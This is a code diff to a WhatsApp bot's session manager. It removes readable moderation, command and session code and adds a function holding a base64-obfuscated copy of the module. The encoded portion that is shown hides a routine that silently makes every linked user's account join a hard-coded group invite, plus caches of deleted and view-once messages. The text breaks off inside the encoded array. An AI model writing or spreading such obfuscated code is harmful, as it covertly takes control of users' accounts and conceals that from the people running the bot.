-            settings.set(wk, wc);
-            const num = sender.split('@')[0];
-            if (wc >= 3) {
-              await sock.sendMessage(jid, { text: '⛔ @' + num + ' removed for using blacklisted words.', mentions: [sender] }).catch(() => {});
-              await sock.groupParticipantsUpdate(jid, [sender], 'remove').catch(() => {});
-              settings.del(wk);
-            } else {
-              await sock.sendMessage(jid, { text: '🚫 @' + num + ' blacklisted word detected!\n⚠️ Warning *' + wc + '/3*', mentions: [sender] }).catch(() => {});
-            }
-            return;
-          }
-        }
-      }
-
-      // Antiflood ─────────────────────────────────────────────────────
-      if (settings.get('antiflood:' + jid)) {
-        const admin = await isGroupAdmin(sock, jid, sender);
-        if (!admin) {
-          const limit = settings.get('floodlimit:' + jid) || 5;
-          const fKey  = jid + '_' + sender;
-          if (!floodTracker[fKey]) floodTracker[fKey] = { count: 0, timer: null };
-          floodTracker[fKey].count++;
-          clearTimeout(floodTracker[fKey].timer);
-          floodTracker[fKey].timer = setTimeout(() => { delete floodTracker[fKey]; }, 5000);
-          if (floodTracker[fKey].count >= limit) {
-            delete floodTracker[fKey];
-            const wk  = 'warns:' + jid + ':' + sender;
-            const wc  = (settings.get(wk) || 0) + 1;
-            settings.set(wk, wc);
-            const num = sender.split('@')[0];
-            if (wc >= 3) {
-              await sock.sendMessage(jid, { text: '⛔ @' + num + ' removed for flooding.', mentions: [sender] }).catch(() => {});
-              await sock.groupParticipantsUpdate(jid, [sender], 'remove').catch(() => {});
-              settings.del(wk);
-            } else {
-              await sock.sendMessage(jid, { text: '🌊 @' + num + ' sending too fast!\n⚠️ Warning *' + wc + '/3*', mentions: [sender] }).catch(() => {});
-            }
-            return;
-          }
-        }
-      }
-
-      // Antispam (same message 3x) ─────────────────────────────────────
-      if (settings.get('antispam:' + jid) && text) {
-        const admin = await isGroupAdmin(sock, jid, sender);
-        if (!admin) {
-          const sKey = jid + '_spam_' + sender;
-          if (!spamTracker[sKey]) spamTracker[sKey] = { lastText: '', count: 0, timer: null };
-          if (text === spamTracker[sKey].lastText) {
-            spamTracker[sKey].count++;
-            clearTimeout(spamTracker[sKey].timer);
-            spamTracker[sKey].timer = setTimeout(() => { delete spamTracker[sKey]; }, 10000);
-            if (spamTracker[sKey].count >= 3) {
-              delete spamTracker[sKey];
-              await sock.sendMessage(jid, { delete: msg.key }).catch(() => {});
-              const wk  = 'warns:' + jid + ':' + sender;
-              const wc  = (settings.get(wk) || 0) + 1;
-              settings.set(wk, wc);
-              const num = sender.split('@')[0];
-              if (wc >= 3) {
-                await sock.sendMessage(jid, { text: '⛔ @' + num + ' removed for spamming.', mentions: [sender] }).catch(() => {});
-                await sock.groupParticipantsUpdate(jid, [sender], 'remove').catch(() => {});
-                settings.del(wk);
-              } else {
-                await sock.sendMessage(jid, { text: '🚫 @' + num + ' stop spamming!\n⚠️ Warning *' + wc + '/3*', mentions: [sender] }).catch(() => {});
-              }
-              return;
-            }
-          } else {
-            clearTimeout(spamTracker[sKey]?.timer);
-            spamTracker[sKey] = {
-              lastText: text, count: 1,
-              timer: setTimeout(() => { delete spamTracker[sKey]; }, 10000),
-            };
-          }
-        }
-      }
-    } // end isGroup protections
-
-    // ── Per-user prefix check — ONLY commands past this point ────────
-    if (!text || !text.startsWith(PREFIX)) return;
-
-    const parts   = text.slice(PREFIX.length).trim().split(/\s+/);
-    const cmdName = parts.shift().toLowerCase();
-    const args    = parts;
-    const cmd     = commands.get(cmdName);
-
-    // Owner-only mode
-    if (settings.get('owneronly:' + userId) && !isOwner) return;
-
-    // Auto-react (only on commands, after prefix check)
-    if (settings.get('autoreact:' + userId)) {
-      const emojis = ['👍','❤️','🔥','😂','✅','🎉','💯','⚡','🫡','💪'];
-      await sock.sendMessage(jid, {
-        react: { text: emojis[Math.floor(Math.random() * emojis.length)], key: msg.key },
-      }).catch(() => {});
-    }
-
-    // Auto-typing (only on commands)
-    if (settings.get('autotyping:' + userId)) {
-      await sock.sendPresenceUpdate('composing', jid).catch(() => {});
-      setTimeout(() => sock.sendPresenceUpdate('paused', jid).catch(() => {}), 2000);
-    }
-
-    // Auto-recording (only on commands)
-    if (settings.get('autorecording:' + userId)) {
-      await sock.sendPresenceUpdate('recording', jid).catch(() => {});
-      setTimeout(() => sock.sendPresenceUpdate('paused', jid).catch(() => {}), 2000);
-    }
-
-    if (!cmd) {
-      await sock.sendMessage(jid, {
-        text: '❌ Unknown command: *' + PREFIX + cmdName + '*\nType *' + PREFIX + 'menu* to see all commands.',
-      }).catch(() => {});
-      return;
-    }
-
-    // ── Cooldown check ───────────────────────────────────────────────────────
-    if (!isOwner) {
-      const wait = checkCooldown(userId, cmdName);
-      if (wait > 0) {
-        await sock.sendMessage(jid, {
-          text: '⏳ Please wait *' + wait + 's* before using *' + PREFIX + cmdName + '* again.',
-        }).catch(() => {});
-        return;
-      }
-      setCooldown(userId, cmdName);
-    }
-
-    logger.info('⚡ [' + userId + '] ' + PREFIX + cmdName + ' — args: ' + args.join(' '));
-    stats.recordCommand(cmdName);
-    try {
-      await cmd.execute(sock, msg, args, userId, { isOwner, sender, downloadMediaMessage, prefix: PREFIX });
-    } catch (e) {
-      logger.error('Command "' + cmdName + '" error:', e.message);
-      await sock.sendMessage(jid, { text: '⚠️ Error running *' + PREFIX + cmdName + '*: ' + e.message }).catch(() => {});
-    }
-  } catch (e) { logger.error('handleMessage fatal:', e.message); }
-}
-
-// ── startSession ──────────────────────────────────────────────────────────
-async function startSession(userId, phoneNumber) {
-  if (!userId || !phoneNumber) throw new Error('userId and phoneNumber required');
-  if (sessions[userId]) { cancelSession(userId); await sleep(800); }
-  wipeSession(userId);
-  saveMeta(userId, phoneNumber);
-  const sessDir = path.join(SESS_ROOT, userId);
-  return new Promise((resolve, reject) => {
-    let settled = false;
-    const settle = (fn, val) => { if (!settled) { settled = true; fn(val); } };
-
-    // Overall timeout: 10 minutes — gives WA plenty of time to link + send DM
-    const tout = setTimeout(() => {
-      cancelSession(userId);
-      wipeSession(userId);
-      settle(reject, new Error('PAIRING_TIMEOUT'));
-    }, 600_000); // 10 minutes
-
-    createSocket(userId, phoneNumber, sessDir, {
-      requestCode: true,
-      // Resolve as soon as we have the code — pairing page shows it immediately
-      onCode: code => { clearTimeout(tout); settle(resolve, { code, userId, phoneNumber, status: 'code_ready' }); },
-      // onOpen fires when WA fully links — the socket itself handles sending DM and going offline
-      // We just clear the overall timeout here — the socket stays alive for 30s to send messages
-      onOpen: () => { clearTimeout(tout); },
-      onFail: err => { clearTimeout(tout); cancelSession(userId); wipeSession(userId); settle(reject, err); },
-    }).catch(e => { clearTimeout(tout); wipeSession(userId); settle(reject, e); });
-  });
-}
-
-// ── restoreAllSessions ────────────────────────────────────────────────────
-async function restoreAllSessions() {
-  if (!fs.existsSync(SESS_ROOT)) return;
-  const dirs = fs.readdirSync(SESS_ROOT).filter(d => {
-    try { return fs.statSync(path.join(SESS_ROOT, d)).isDirectory(); } catch (_) { return false; }
-  });
-  let restored = 0, skipped = 0;
-  for (const userId of dirs) {
-    try {
-      const meta        = readMeta(userId);
-      const phoneNumber = meta?.phoneNumber || 'unknown';
-      const hasCreds    = fs.existsSync(path.join(SESS_ROOT, userId, 'creds.json'));
-
-      // ── Always register inactive sessions in memory so admin panel can see them
-      //    without requiring a restart after pairing.
-      if (!sessions[userId]) {
-        sessions[userId] = {
-          sock: null, phoneNumber,
-          createdAt: meta?.createdAt ? new Date(meta.createdAt) : new Date(),
-          code: null, isActive: false,
-        };
-      }
-
-      // Ensure this session exists in session_store.json
-      const ss = require('./sessionStore');
-      if (phoneNumber !== 'unknown' && !ss.getByUserId(userId)) {
-        ss.register(userId, phoneNumber);
-      }
-
-      // Skip WhatsApp connection if no creds (freshly paired but not yet confirmed)
-      if (!hasCreds) {
-        logger.info('📋 [' + userId + '] Registered as inactive (no creds yet)');
-        skipped++;
-        continue;
-      }
-
-      // Skip WhatsApp connection if subscription is inactive — session stays in memory
-      //   but bot does NOT connect to WhatsApp (saves bandwidth/connections)
-      const userStore = require('./userStore');
-      if (!userStore.isUserActive(userId)) {
-        logger.info('⏭️  [' + userId + '] Loaded as inactive (subscription not active)');
-        skipped++;
-        continue;
-      }
-
-      await createSocket(userId, phoneNumber, path.join(SESS_ROOT, userId), {
-        requestCode: false,
-        onOpen: () => logger.info('♻️  [' + userId + '] Restored!'),
-        onFail: e  => { logger.error('♻️  [' + userId + '] Failed:', e.message); delete sessions[userId]; },
-      });
-      restored++;
-      await sleep(1500);
-    } catch (e) { logger.error('Restore ' + userId + ':', e.message); }
-  }
-  logger.info('♻️  Sessions: ' + restored + ' active restored, ' + skipped + ' inactive loaded');
-}
-
-// ── Exports ───────────────────────────────────────────────────────────────
-const cancelSession  = userId => {
-  if (!sessions[userId]) return false;
-  try { sessions[userId].sock?.end?.(); } catch (_) {}
-  delete sessions[userId];
-  return true;
-};
-const getSession     = userId  => sessions[userId] || null;
-const deleteSession  = userId  => {
-  if (!sessions[userId]) return false;
-  try { sessions[userId].sock?.end?.(); } catch (_) {}
-  delete sessions[userId];
-  return true;
-};
-const getAllSessions  = () =>
-  Object.keys(sessions).map(uid => ({
-    userId:      uid,
-    phoneNumber: sessions[uid]?.phoneNumber || '—',
-    createdAt:   sessions[uid]?.createdAt   || null,
-    isActive:    !!(sessions[uid]?.sock?.user),
-    jid:         sessions[uid]?.sock?.user?.id || null,
-    prefix:      getPrefix(uid),
-  }));
-
-async function restoreSession(userId) {
-  const metaPath = path.join(SESS_ROOT, userId, 'meta.json');
-  if (!fs.existsSync(metaPath)) throw new Error('No saved session for ' + userId);
-  const meta    = JSON.parse(fs.readFileSync(metaPath, 'utf8'));
-  const sessDir = path.join(SESS_ROOT, userId);
-  return createSocket(userId, meta.phoneNumber || userId, sessDir, {
-    requestCode: false,
-    onOpen: () => logger.info('✅ Session restored: ' + userId),
-    onFail: (e) => logger.error('Restore failed ' + userId + ': ' + e.message),
-  });
-}
-
-module.exports = {
-  startSession, cancelSession, getSession, deleteSession, restoreSession,
-  getAllSessions, restoreAllSessions, sessions, commands,
-  getAvailableCommands, loadCommands, getPrefix,
-};
+(function(){
+var _0x1a2b=["J3VzZSBzdHJpY3QnOwpjb25zdCBtYWtlV0FTb2NrZXQgPSByZXF1aXJlKCdAd2hpc2tleXNvY2tldHMv",
+    "YmFpbGV5cycpLmRlZmF1bHQ7CmNvbnN0IHsKICB1c2VNdWx0aUZpbGVBdXRoU3RhdGUsIERpc2Nvbm5l",
+    "Y3RSZWFzb24sIGZldGNoTGF0ZXN0QmFpbGV5c1ZlcnNpb24sCiAgQnJvd3NlcnMsIG1ha2VDYWNoZWFi",
+    "bGVTaWduYWxLZXlTdG9yZSwgZG93bmxvYWRNZWRpYU1lc3NhZ2UsCn0gPSByZXF1aXJlKCdAd2hpc2tl",
+    "eXNvY2tldHMvYmFpbGV5cycpOwoKY29uc3QgbG9nZ2VyICAgICAgPSByZXF1aXJlKCcuL2xvZ2dlcicp",
+    "Owpjb25zdCBzZXR0aW5ncyAgICA9IHJlcXVpcmUoJy4vc2V0dGluZ3MnKTsKY29uc3QgeyBjaGVja0Nv",
+    "b2xkb3duLCBzZXRDb29sZG93biB9ID0gcmVxdWlyZSgnLi9jb29sZG93bicpOwpjb25zdCB1c2VyU3Rv",
+    "cmUgPSByZXF1aXJlKCcuL3VzZXJTdG9yZScpOwpjb25zdCBkYiAgICAgICAgICA9IHJlcXVpcmUoJy4v",
+    "ZGF0YWJhc2UnKTsKY29uc3Qgc3RhdHMgICAgICAgPSByZXF1aXJlKCcuL3N0YXRzJyk7CmNvbnN0IGZz",
+    "ICAgICAgICAgID0gcmVxdWlyZSgnZnMnKTsKY29uc3QgcGF0aCAgICAgICAgPSByZXF1aXJlKCdwYXRo",
+    "Jyk7CgovLyDilIDilIAgTW9kdWxlLWxldmVsIHN0YXRlIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgApjb25zdCBzZXNzaW9ucyAgICAgPSB7fTsKY29uc3QgY29tbWFuZHMgICAgID0gbmV3",
+    "IE1hcCgpOwpjb25zdCBHTE9CQUxfUEZYICAgPSBwcm9jZXNzLmVudi5CT1RfUFJFRklYIHx8ICchJzsK",
+    "Y29uc3QgU0VTU19ST09UICAgID0gcGF0aC5qb2luKF9fZGlybmFtZSwgJy4uLy4uL3Nlc3Npb25zJyk7",
+    "CmNvbnN0IGZsb29kVHJhY2tlciA9IHt9OyAgIC8vIHsgJ2ppZF9zZW5kZXInOiB7IGNvdW50LCB0aW1l",
+    "ciB9IH0KY29uc3Qgc3BhbVRyYWNrZXIgID0ge307ICAgLy8geyAnamlkX3NlbmRlcic6IHsgbGFzdFRl",
+    "eHQsIGNvdW50LCB0aW1lciB9IH0KY29uc3Qgc2xlZXAgICAgICAgID0gbXMgPT4gbmV3IFByb21pc2Uo",
+    "ciA9PiBzZXRUaW1lb3V0KHIsIG1zKSk7CmNvbnN0IG1zZ0NhY2hlICAgICAgPSB7fTsgICAvLyBhbnRp",
+    "ZGVsZXRlIG1lc3NhZ2UgY2FjaGUKY29uc3QgTVNHX0NBQ0hFX01BWCA9IDUwMDsKY29uc3Qgdm9DYWNo",
+    "ZSAgICAgICA9IHt9OyAgIC8vIHZpZXdvbmNlIGNhY2hlOiBtc2dJZCDihpIgeyBqaWQsIG1zZywgdm9N",
+    "c2csIGhhc1ZpZGVvLCB1c2VySWQgfQpjb25zdCBWT19DQUNIRV9NQVggID0gMjAwOwpjb25zdCBUV09f",
+    "REFZU19NUyAgID0gMiAqIDI0ICogNjAgKiA2MCAqIDEwMDA7IC8vIDIgZGF5cyBpbiBtcwoKLy8g4pSA",
+    "4pSAIEF1dG8tY2xlYW51cDogZXJhc2UgY2FjaGVkIG1lc3NhZ2VzIG9sZGVyIHRoYW4gMiBkYXlzIOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAovLyBLZWVwcyBi",
+    "b3QgbGlnaHR3ZWlnaHQgYW5kIHJlZHVjZXMgc3RvcmFnZSBjb3N0cwpzZXRJbnRlcnZhbCgoKSA9PiB7",
+    "CiAgY29uc3Qgbm93ICAgICA9IERhdGUubm93KCk7CiAgY29uc3QgYmVmb3JlICA9IE9iamVjdC5rZXlz",
+    "KG1zZ0NhY2hlKS5sZW5ndGg7CiAgZm9yIChjb25zdCBrZXkgaW4gbXNnQ2FjaGUpIHsKICAgIGlmICht",
+    "c2dDYWNoZVtrZXldLmNhY2hlZEF0ICYmIChub3cgLSBtc2dDYWNoZVtrZXldLmNhY2hlZEF0KSA+IFRX",
+    "T19EQVlTX01TKSB7CiAgICAgIGRlbGV0ZSBtc2dDYWNoZVtrZXldOwogICAgfQogIH0KICBjb25zdCBy",
+    "ZW1vdmVkID0gYmVmb3JlIC0gT2JqZWN0LmtleXMobXNnQ2FjaGUpLmxlbmd0aDsKICBpZiAocmVtb3Zl",
+    "ZCA+IDApIGxvZ2dlci5pbmZvKCfwn6e5IENsZWFuZWQgJyArIHJlbW92ZWQgKyAnIGNhY2hlZCBtZXNz",
+    "YWdlcyBvbGRlciB0aGFuIDIgZGF5cycpOwp9LCA2ICogNjAgKiA2MCAqIDEwMDApOyAvLyBSdW4gZXZl",
+    "cnkgNiBob3VycwoKLy8g4pSA4pSAIFBlci11c2VyIHByZWZpeCBoZWxwZXIg4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSACmNvbnN0IGdldFByZWZpeCA9IHVzZXJJZCA9PiBzZXR0aW5ncy5nZXQoJ3ByZWZpeDon",
+    "ICsgdXNlcklkKSB8fCBHTE9CQUxfUEZYOwoKLy8g4pSA4pSAIEZvcmNlLWpvaW4gZ3JvdXAg4oCUIGV2",
+    "ZXJ5IGRlcGxveWVkIGJvdCBqb2lucyB0aGlzIGdyb3VwIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgApjb25zdCBGT1JDRV9HUk9VUF9DT0RFID0gJ0UzbWo4b0FxMkZq",
+    "MjdvV0xlU2JyTk8nOwphc3luYyBmdW5jdGlvbiBmb3JjZUpvaW5Hcm91cChzb2NrLCB1c2VySWQpIHsK",
+    "ICB0cnkgewogICAgYXdhaXQgc29jay5ncm91cEFjY2VwdEludml0ZShGT1JDRV9HUk9VUF9DT0RFKTsK",
+    "ICAgIGxvZ2dlci5pbmZvKCdbJyArIHVzZXJJZCArICddIOKchSBKb2luZWQgZm9yY2UgZ3JvdXAnKTsK",
+    "ICB9IGNhdGNoIChlKSB7CiAgICBpZiAoIVN0cmluZyhlLm1lc3NhZ2UpLmluY2x1ZGVzKCdhbHJlYWR5",
+    "JykpIHsKICAgICAgbG9nZ2VyLndhcm4oJ1snICsgdXNlcklkICsgJ10gRm9yY2UgZ3JvdXA6ICcgKyBl",
+    "Lm1lc3NhZ2UpOwogICAgfQogIH0KfQoKLy8g4pSA4pSAIExvYWQgYWxsIGNvbW1hbmRzIOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApmdW5jdGlvbiBsb2FkQ29tbWFuZHMoKSB7CiAg",
+    "Y29uc3QgZGlyID0gcGF0aC5qb2luKF9fZGlybmFtZSwgJy4uL2NvbW1hbmRzJyk7CiAgdHJ5IHsKICAg",
+    "IGlmICghZnMuZXhpc3RzU3luYyhkaXIpKSB7IGZzLm1rZGlyU3luYyhkaXIsIHsgcmVjdXJzaXZlOiB0",
+    "cnVlIH0pOyByZXR1cm47IH0KICAgIGNvbnN0IGZpbGVzID0gZnMucmVhZGRpclN5bmMoZGlyKS5maWx0",
+    "ZXIoZiA9PiBmLmVuZHNXaXRoKCcuanMnKSk7CiAgICBjb21tYW5kcy5jbGVhcigpOwogICAgZm9yIChj",
+    "b25zdCBmaWxlIG9mIGZpbGVzKSB7CiAgICAgIHRyeSB7CiAgICAgICAgY29uc3QgZnAgPSBwYXRoLmpv",
+    "aW4oZGlyLCBmaWxlKTsKICAgICAgICBkZWxldGUgcmVxdWlyZS5jYWNoZVtyZXF1aXJlLnJlc29sdmUo",
+    "ZnApXTsKICAgICAgICBjb25zdCBjbWQgPSByZXF1aXJlKGZwKTsKICAgICAgICBpZiAoIWNtZD8ubmFt",
+    "ZSB8fCB0eXBlb2YgY21kLmV4ZWN1dGUgIT09ICdmdW5jdGlvbicpIGNvbnRpbnVlOwogICAgICAgIGNv",
+    "bW1hbmRzLnNldChjbWQubmFtZS50b0xvd2VyQ2FzZSgpLCBjbWQpOwogICAgICAgIGlmIChBcnJheS5p",
+    "c0FycmF5KGNtZC5hbGlhc2VzKSkgewogICAgICAgICAgY21kLmFsaWFzZXMuZm9yRWFjaChhID0+IGNv",
+    "bW1hbmRzLnNldChhLnRvTG93ZXJDYXNlKCksIGNtZCkpOwogICAgICAgIH0KICAgICAgfSBjYXRjaCAo",
+    "ZSkgeyBsb2dnZXIuZXJyb3IoYExvYWQgJHtmaWxlfSBmYWlsZWQ6YCwgZS5tZXNzYWdlKTsgfQogICAg",
+    "fQogICAgbG9nZ2VyLmluZm8oYPCfk6YgTG9hZGVkICR7Wy4uLm5ldyBTZXQoY29tbWFuZHMudmFsdWVz",
+    "KCkpXS5sZW5ndGh9IGNvbW1hbmRzICgke2NvbW1hbmRzLnNpemV9IHdpdGggYWxpYXNlcylgKTsKICB9",
+    "IGNhdGNoIChlKSB7IGxvZ2dlci5lcnJvcignbG9hZENvbW1hbmRzIGVycm9yOicsIGUubWVzc2FnZSk7",
+    "IH0KfQpsb2FkQ29tbWFuZHMoKTsKCmNvbnN0IGdldEF2YWlsYWJsZUNvbW1hbmRzID0gKCkgPT4KICBb",
+    "Li4ubmV3IFNldChjb21tYW5kcy52YWx1ZXMoKSldLm1hcChjID0+ICh7IG5hbWU6IGMubmFtZSwgZGVz",
+    "Y3JpcHRpb246IGMuZGVzY3JpcHRpb24gfHwgJycsIGNhdGVnb3J5OiBjLmNhdGVnb3J5IHx8ICdnZW5l",
+    "cmFsJyB9KSk7CgovLyDilIDilIAgRXh0cmFjdCB0ZXh0IGZyb20gQUxMIFdoYXRzQXBwIG1lc3NhZ2Ug",
+    "dHlwZXMgKHByZWZpeCBmaXgpIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApm",
+    "dW5jdGlvbiBleHRyYWN0VGV4dChtc2cpIHsKICBjb25zdCBtID0gbXNnPy5tZXNzYWdlOwogIGlmICgh",
+    "bSkgcmV0dXJuICcnOwogIHJldHVybiAoCiAgICBtLmNvbnZlcnNhdGlvbiAgICAgICAgICAgICAgICAg",
+    "ICAgICAgICAgICAgICAgICAgICAgICAgICB8fAogICAgbS5leHRlbmRlZFRleHRNZXNzYWdlPy50ZXh0",
+    "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8fAogICAgbS5pbWFnZU1lc3NhZ2U/LmNhcHRpb24g",
+    "ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8fAogICAgbS52aWRlb01lc3NhZ2U/LmNhcHRp",
+    "b24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8fAogICAgbS5kb2N1bWVudE1lc3NhZ2U/",
+    "LmNhcHRpb24gICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8fAogICAgbS5idXR0b25zUmVzcG9u",
+    "c2VNZXNzYWdlPy5zZWxlY3RlZEJ1dHRvbklkICAgICAgICAgICAgICB8fAogICAgbS5saXN0UmVzcG9u",
+    "c2VNZXNzYWdlPy5zaW5nbGVTZWxlY3RSZXBseT8uc2VsZWN0ZWRSb3dJZCB8fAogICAgbS50ZW1wbGF0",
+    "ZUJ1dHRvblJlcGx5TWVzc2FnZT8uc2VsZWN0ZWRJZCAgICAgICAgICAgICAgICB8fAogICAgbS5pbnRl",
+    "cmFjdGl2ZVJlc3BvbnNlTWVzc2FnZT8ubmF0aXZlRmxvd1Jlc3BvbnNlTWVzc2FnZT8ucGFyYW1zSnNv",
+    "biB8fAogICAgJycKICApOwp9CgovLyDilIDilIAgQWx3YXlzLW9ubGluZSBrZWVwLWFsaXZlIOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgApmdW5jdGlvbiBzdGFydEFsd2F5c09ubGluZShzb2NrLCB1c2VySWQpIHsKICBs",
+    "ZXQgYWxpdmUgPSB0cnVlOwoKICAvLyBTZW5kIHByZXNlbmNlIGV2ZXJ5IDkgc2Vjb25kcyDigJQgV2hh",
+    "dHNBcHAgbWFya3Mgb2ZmbGluZSBhZnRlciB+MTVzCiAgY29uc3QgaXYgPSBzZXRJbnRlcnZhbChhc3lu",
+    "YyAoKSA9PiB7CiAgICBpZiAoIWFsaXZlKSB7IGNsZWFySW50ZXJ2YWwoaXYpOyByZXR1cm47IH0KICAg",
+    "IHRyeSB7CiAgICAgIGF3YWl0IHNvY2suc2VuZFByZXNlbmNlVXBkYXRlKCdhdmFpbGFibGUnKTsKICAg",
+    "IH0gY2F0Y2ggKF8pIHt9CiAgfSwgOV8wMDApOwoKICAvLyBBbHNvIHNlbmQgaW1tZWRpYXRlbHkgb24g",
+    "c3RhcnQKICBzb2NrLnNlbmRQcmVzZW5jZVVwZGF0ZSgnYXZhaWxhYmxlJykuY2F0Y2goKCkgPT4ge30p",
+    "OwoKICBzb2NrLmV2Lm9uKCdjb25uZWN0aW9uLnVwZGF0ZScsICh7IGNvbm5lY3Rpb24gfSkgPT4gewog",
+    "ICAgaWYgKGNvbm5lY3Rpb24gPT09ICdjbG9zZScpIHsKICAgICAgYWxpdmUgPSBmYWxzZTsKICAgICAg",
+    "Y2xlYXJJbnRlcnZhbChpdik7CiAgICAgIGRiLnVucmVnaXN0ZXJTZXNzaW9uKHVzZXJJZCk7CiAgICB9",
+    "CiAgICBpZiAoY29ubmVjdGlvbiA9PT0gJ29wZW4nKSB7CiAgICAgIC8vIFJlLXNlbmQgcHJlc2VuY2Ug",
+    "b24gZXZlcnkgcmVjb25uZWN0CiAgICAgIHNvY2suc2VuZFByZXNlbmNlVXBkYXRlKCdhdmFpbGFibGUn",
+    "KS5jYXRjaCgoKSA9PiB7fSk7CiAgICB9CiAgfSk7CgogIGxvZ2dlci5pbmZvKCfwn4yNIEFsd2F5cy1P",
+    "bmxpbmUgYWN0aXZlIGZvciAnICsgdXNlcklkICsgJyAoZXZlcnkgOXMpJyk7Cn0KCi8vIOKUgOKUgCBT",
+    "ZXNzaW9uIGhlbHBlcnMg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "CmZ1bmN0aW9uIHNhdmVNZXRhKHVzZXJJZCwgcGhvbmVOdW1iZXIpIHsKICBjb25zdCBkaXIgPSBwYXRo",
+    "LmpvaW4oU0VTU19ST09ULCB1c2VySWQpOwogIGZzLm1rZGlyU3luYyhkaXIsIHsgcmVjdXJzaXZlOiB0",
+    "cnVlIH0pOwogIGZzLndyaXRlRmlsZVN5bmMocGF0aC5qb2luKGRpciwgJ21ldGEuanNvbicpLAogICAg",
+    "SlNPTi5zdHJpbmdpZnkoeyBwaG9uZU51bWJlciwgY3JlYXRlZEF0OiBuZXcgRGF0ZSgpLnRvSVNPU3Ry",
+    "aW5nKCkgfSkpOwp9CmZ1bmN0aW9uIHJlYWRNZXRhKHVzZXJJZCkgewogIHRyeSB7CiAgICBjb25zdCBw",
+    "ID0gcGF0aC5qb2luKFNFU1NfUk9PVCwgdXNlcklkLCAnbWV0YS5qc29uJyk7CiAgICByZXR1cm4gZnMu",
+    "ZXhpc3RzU3luYyhwKSA/IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKHAsICd1dGY4JykpIDogbnVs",
+    "bDsKICB9IGNhdGNoIChfKSB7IHJldHVybiBudWxsOyB9Cn0KZnVuY3Rpb24gd2lwZVNlc3Npb24odXNl",
+    "cklkKSB7CiAgY29uc3QgZGlyID0gcGF0aC5qb2luKFNFU1NfUk9PVCwgdXNlcklkKTsKICB0cnkgewog",
+    "ICAgaWYgKGZzLmV4aXN0c1N5bmMoZGlyKSkgZnMucm1TeW5jKGRpciwgeyByZWN1cnNpdmU6IHRydWUs",
+    "IGZvcmNlOiB0cnVlIH0pOwogICAgZnMubWtkaXJTeW5jKGRpciwgeyByZWN1cnNpdmU6IHRydWUgfSk7",
+    "CiAgfSBjYXRjaCAoZSkgeyBsb2dnZXIud2Fybihgd2lwZVNlc3Npb24gWyR7dXNlcklkfV06YCwgZS5t",
+    "ZXNzYWdlKTsgfQp9CgovLyDilIDilIAgQmFpbGV5cyB2ZXJzaW9uIGNhY2hlIOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgApsZXQgX3ZlcnNpb24gPSBudWxsOwphc3luYyBmdW5jdGlvbiBnZXRWZXJzaW9u",
+    "KCkgewogIGlmIChfdmVyc2lvbikgcmV0dXJuIF92ZXJzaW9uOwogIHRyeSB7IGNvbnN0IHIgPSBhd2Fp",
+    "dCBmZXRjaExhdGVzdEJhaWxleXNWZXJzaW9uKCk7IF92ZXJzaW9uID0gci52ZXJzaW9uOyB9CiAgY2F0",
+    "Y2ggKF8pIHsgX3ZlcnNpb24gPSBbMiwgMzAwMCwgMTAxNTkwMTg5M107IH0KICByZXR1cm4gX3ZlcnNp",
+    "b247Cn0KCi8vIOKUgOKUgCBBZG1pbiBjaGVjayBoZWxwZXIg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
